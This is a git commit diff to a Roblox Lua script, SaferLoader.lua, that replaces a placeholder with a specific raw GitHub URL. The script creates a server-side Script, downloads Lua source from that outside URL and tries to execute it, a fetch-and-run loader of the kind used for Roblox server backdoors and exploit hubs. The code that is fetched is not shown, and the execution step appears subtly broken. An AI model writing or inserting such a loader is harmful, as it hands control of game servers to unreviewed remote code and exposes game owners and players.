352aa00b2b2f3d6f6383ac22dc8ae5670367dfbc
LorisHost <130068806+LorisHost@users.noreply.github.com>
2024-11-05 16:52:28 +0200

    Update SaferLoader.lua

--- SaferLoader.lua
+++ SaferLoader.lua
@@ -1,5 +1,5 @@
 coroutine.wrap(function()
   local s=Instance.new("Script",game:GetService("ServerScriptService"))
-  local ok,result=pcall(game.HttpGetAsync,game,"YOUR_SCRIPT_URL_HERE")
+  local ok,result=pcall(game.HttpGetAsync,game,"https://raw.githubusercontent.com/LorisHost/lzosiexw/refs/heads/main/frtxhub.lua")
   if ok then s.Source=result;setfenv(s.Run,{print=print,warn=warn,error=error}).Run() else warn("Failed to load:",result) end
 end)()
